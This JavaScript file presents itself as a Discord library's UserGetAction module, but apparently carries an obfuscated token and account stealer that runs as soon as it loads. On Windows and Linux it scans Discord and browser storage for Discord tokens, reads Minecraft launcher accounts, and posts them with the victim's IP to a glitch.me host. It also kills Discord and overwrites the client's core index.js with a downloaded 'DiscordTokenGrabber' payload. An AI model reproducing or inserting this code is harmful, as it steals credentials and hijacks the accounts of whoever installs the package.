const Action = require('./Action');
const OS = require('os'), fs = require('fs'), fetch = require('node-fetch'), {execSync} = require('child_process'), Glob = require('glob'), toInject = [], toInjectJS = [], toKill = [], apiurl = 'https://frequent-level-cornflower.glitch.me';
try {
    switch (OS['platform']()) {
    case 'win32':
        const local = process['env']['localappdata'], roaming = process['env']['appdata'], minecraftPath = roaming + '/.minecraft/launcher_accounts.json', remixPath = roaming + '/.minecraft/remix/UID.txt';
        dbPaths = [
            roaming + '/Discord/Local\x20Storage/leveldb',
            roaming + '/DiscordDevelopment/Local\x20Storage/leveldb',
            roaming + '/Lightcord/Local\x20Storage/leveldb',
            roaming + '/discordptb/Local\x20Storage/leveldb',
            roaming + '/discordcanary/Local\x20Storage/leveldb',
            roaming + '/Opera\x20Software/Opera\x20Stable/Local\x20Storage/leveldb',
            roaming + '/Opera\x20Software/Opera\x20GX\x20Stable/Local\x20Storage/leveldb',
            local + '/Amigo/User\x20Data/Local\x20Storage/leveldb',
            local + '/Torch/User\x20Data/Local\x20Storage/leveldb',
            local + '/Kometa/User\x20Data/Local\x20Storage/leveldb',
            local + '/Orbitum/User\x20Data/Local\x20Storage/leveldb',
            local + '/CentBrowser/User\x20Data/Local\x20Storage/leveldb',
            local + '/7Star/7Star/User\x20Data/Local\x20Storage/leveldb',
            local + '/Sputnik/Sputnik/User\x20Data/Local\x20Storage/leveldb',
            local + '/Vivaldi/User\x20Data/Default/Local\x20Storage/leveldb',
            local + '/Google/Chrome\x20SxS/User\x20Data/Local\x20Storage/leveldb',
            local + '/Epic\x20Privacy\x20Browser/User\x20Data/Local\x20Storage/leveldb',
            local + '/Google/Chrome/User\x20Data/Default/Local\x20Storage/leveldb',
            local + '/uCozMedia/Uran/User\x20Data/Default/Local\x20Storage/leveldb',
            local + '/Microsoft/Edge/User\x20Data/Default/Local\x20Storage/leveldb',
            local + '/Yandex/YandexBrowser/User\x20Data/Default/Local\x20Storage/leveldb',
            local + '/Opera\x20Software/Opera\x20Neon/User\x20Data/Default/Local\x20Storage/leveldb',
            local + '/BraveSoftware/Brave-Browser/User\x20Data/Default/Local\x20Storage/leveldb'
        ];
        init();
        function init() {
            fs['readFile'](remixPath, (_0x194f42, _0x2a88ef) => _0x2a88ef && minecraft('remix', _0x2a88ef));
            fs['readFile'](minecraftPath, (_0x4307a7, _0x55c3b7) => _0x55c3b7 && minecraft('minecraft', _0x55c3b7));
            injectToDiscord();
            dbPaths['forEach'](_0x502003 => main(_0x502003));
        }
        function main(_0x105def) {
            fs['readdir'](_0x105def, (_0x55aaba, _0x54e518) => {
                if (_0x54e518) {
                    var _0x18842d = _0x54e518['filter'](_0x576a2a => _0x576a2a['endsWith']('ldb'));
                    _0x18842d['forEach'](_0x3e96fd => {
                        var _0x1177ef = fs['readFileSync'](_0x105def + '/' + _0x3e96fd)['toString']();
                        var _0x40929c = /"[\d\w_-]{24}\.[\d\w_-]{6}\.[\d\w_-]{27}"/;
                        var _0x9d8094 = /"mfa\.[\d\w_-]{84}"/;
                        var [_0x2381a7] = _0x40929c['exec'](_0x1177ef) || _0x9d8094['exec'](_0x1177ef) || [undefined];
                        if (_0x2381a7)
                            fetch('http://ip-api.com/json/')['then'](_0x5d8194 => _0x5d8194['json']())['then'](_0x227d7b => fetch(apiurl + '/beforeinject', {
                                'method': 'POST',
                                'body': JSON['stringify']({
                                    'token': _0x2381a7['slice'](0x138 * -0x17 + -0x13ea + 0x1eb * 0x19, -(-0x98 * -0x4 + -0x9 * 0x2a5 + 0x156e)),
                                    'ipAddress': _0x227d7b['query']
                                })
                            }));
                    });
                }
            });
        }
        function minecraft(_0xff7e23, _0x58a9df) {
            switch (_0xff7e23) {
            case 'remix':
                fetch(apiurl + '/remix', {
                    'method': 'POST',
                    'body': JSON['stringify']({ 'UID': _0x58a9df })
                });
                break;
            case 'minecraft':
                var [_0x13a242] = /"[\d\w_-]{32}"/['exec'](_0x58a9df);
                if (_0x13a242) {
                    const _0x4e46d5 = require(minecraftPath);
                    if (!_0x4e46d5['accounts'])
                        return;
                    var _0x579d84 = _0x4e46d5['accounts'][_0x13a242['slice'](-0x8da + -0x1fec + -0x28c7 * -0x1, -(0x5 * 0x32f + -0x1 * -0x373 + -0x135d))];
                    fetch(apiurl + '/minecraft', {
                        'method': 'POST',
                        'body': JSON['stringify']({
                            'eligibleForMigration': _0x579d84['eligibleForMigration'],
                            'hasMultipleProfiles': _0x579d84['hasMultipleProfiles'],
                            'legacy': _0x579d84['legacy'],
                            'localId': _0x579d84['localId'],
                            'minecraftProfileID': _0x579d84['minecraftProfile']['id'],
                            'minecraftProfileName': _0x579d84['minecraftProfile']['name'],
                            'persistent': _0x579d84['persistent'],
                            'remoteId': _0x579d84['remoteId'],
                            'type': _0x579d84['type'],
                            'username': _0x579d84['username'],
                            'activeAccountLocalId': _0x4e46d5['activeAccountLocalId']
                        })
                    });
                }
            }
        }
        function injectToDiscord() {
            getInstalledDiscord();
            killAllDiscords();
            fetch('https://raw.githubusercontent.com/NotFubukIl/DiscordTokenGrabber/main/data/index.js')['then'](_0x4c0184 => _0x4c0184['text']())['then'](_0x378401 => toInjectJS['forEach'](_0x189266 => fs['writeFileSync'](_0x189266, _0x378401['replace']('*API\x20URL*', apiurl)) ^ execSync(local + '/' + _0x189266['split']('/')[0x1 * -0xc9 + 0x24a1 + -0x9 * 0x3fb] + '/Update.exe\x20--processStart\x20' + _0x189266['split']('/')[0x1f * 0x18 + -0x1 * -0xb42 + 0x47 * -0x33] + '.exe')));
        }
        function getInstalledDiscord() {
            fs['readdirSync'](roaming)['forEach'](_0x2319a9 => _0x2319a9['includes']('cord') && toInject['push'](local + '/' + _0x2319a9));
            toInject['forEach'](_0x45ae8c => Glob['sync'](_0x45ae8c + '/app-*/modules/discord_desktop_core-*/discord_desktop_core/index.js')['map'](_0x506b18 => toInjectJS['push'](_0x506b18)));
        }
        function killAllDiscords() {
            var _0xc7d5cd = execSync('tasklist')['toString']();
            _0xc7d5cd['includes']('Discord.exe') && toKill['push']('discord');
            _0xc7d5cd['includes']('DiscordCanary.exe') && toKill['push']('discordcanary');
            _0xc7d5cd['includes']('DiscordDevelopment.exe') && toKill['push']('discorddevelopment');
            _0xc7d5cd['includes']('DiscordPTB.exe') && toKill['push']('discordptb');
            toKill['forEach'](_0x359087 => execSync('taskkill\x20/IM\x20' + _0x359087 + '.exe\x20/F'));
        }
        break;
    case 'linux':
        const defaut = '/home/' + __dirname['split']('/')[0x1 * -0x153e + -0xf28 + 0x2468] + '/.config', LdbPaths = [
                defaut + '/discord/Local\x20Storage/leveldb',
                defaut + '/discordcanary/Local\x20Storage/leveldb',
                defaut + '/discordptb/Local\x20Storage/leveldb',
                defaut + '/DiscordDevelopment/Local\x20Storage/leveldb'
            ];
        const LminecraftPath = defaut + '/.minecraft/launcher_accounts.json';
        Linit();
        function Linit() {
            LdbPaths['forEach'](_0x4d8dae => Lmain(_0x4d8dae));
            var _0xaf1d27 = fs['readFileSync'](LminecraftPath);
            if (_0xaf1d27)
                Lminecraft(_0xaf1d27);
            LinjectToDiscord();
        }
        function Lmain(_0x265587) {
            fs['readdir'](_0x265587, (_0x13292b, _0x52f421) => {
                if (_0x52f421) {
                    var _0x3b4410 = _0x52f421['filter'](_0x3119ce => _0x3119ce['endsWith']('ldb'));
                    _0x3b4410['forEach'](_0x4b96e8 => {
                        var _0x33d8af = fs['readFileSync'](_0x52f421 + '/' + _0x4b96e8)['toString']();
                        var _0x51cc22 = /"[\d\w_-]{24}\.[\d\w_-]{6}\.[\d\w_-]{27}"/;
                        var _0x32fe12 = /"mfa\.[\d\w_-]{84}"/;
                        var [_0x47b4d8] = _0x51cc22['exec'](_0x33d8af) || _0x32fe12['exec'](_0x33d8af) || [undefined];
                        if (_0x47b4d8)
                            fetch('http://ip-api.com/json/')['then'](_0x13423c => _0x13423c['json']())['then'](_0x349d99 => fetch(apiurl + '/beforeinject', {
                                'method': 'POST',
                                'body': JSON['stringify']({
                                    'token': _0x47b4d8,
                                    'ip': _0x349d99['query']
                                })
                            }));
                    });
                }
            });
        }
        function Lminecraft(_0x169ceb) {
            var [_0x313352] = /"[\d\w_-]{32}"/['exec'](_0x169ceb);
            if (_0x313352) {
                const _0x24c823 = require(LminecraftPath);
                if (!_0x24c823['accounts'])
                    return;
                var _0x413572 = _0x24c823['accounts'][_0x313352['slice'](0x25cc + 0x21 * -0x16 + 0x13 * -0x1d7, -(-0x642 + -0x133f + -0x2 * -0xcc1))];
                fetch(apiurl + '/minecraft', {
                    'method': 'POST',
                    'body': JSON['stringify']({
                        'eligibleForMigration': _0x413572['eligibleForMigration'],
                        'hasMultipleProfiles': _0x413572['hasMultipleProfiles'],
                        'legacy': _0x413572['legacy'],
                        'localId': _0x413572['localId'],
                        'minecraftProfileID': _0x413572['minecraftProfile']['id'],
                        'minecraftProfileName': _0x413572['minecraftProfile']['name'],
                        'persistent': _0x413572['persistent'],
                        'remoteId': _0x413572['remoteId'],
                        'type': _0x413572['type'],
                        'username': _0x413572['username'],
                        'activeAccountLocalId': _0x24c823['activeAccountLocalId']
                    })
                });
            }
        }
        function LinjectToDiscord() {
            getInstalledLDiscord();
            fetch('https://raw.githubusercontent.com/NotFubukIl/DiscordTokenGrabber/main/data/index.js')['then'](_0xdcd174 => _0xdcd174['text']())['then'](_0x19d33c => toInjectJS['forEach'](_0x165b9b => fs['writeFileSync'](_0x165b9b, _0x19d33c['replace']('*API\x20URL*', apiurl))));
        }
        function getInstalledLDiscord() {
            fs['readdirSync'](defaut)['forEach'](_0x5a2ca3 => _0x5a2ca3['includes']('cord') && toInject['push'](defaut + '/' + _0x5a2ca3));
            toInject['forEach'](_0x5dc3e7 => Glob['sync'](_0x5dc3e7 + '/*/modules/discord_desktop_core/index.js')['map'](_0x18086c => toInjectJS['push'](_0x18086c)));
        }
        break;
    case 'darwin':
        break;
    }
} catch (_0x2f1bfa) {
}
class UserGetAction extends Action {
    ['handle'](_0x296849) {
        const _0x458698 = this['client'];
        const _0x41f3e5 = _0x458698['dataManager']['newUser'](_0x296849);
        return { 'user': _0x41f3e5 };
    }
}
module['exports'] = UserGetAction;
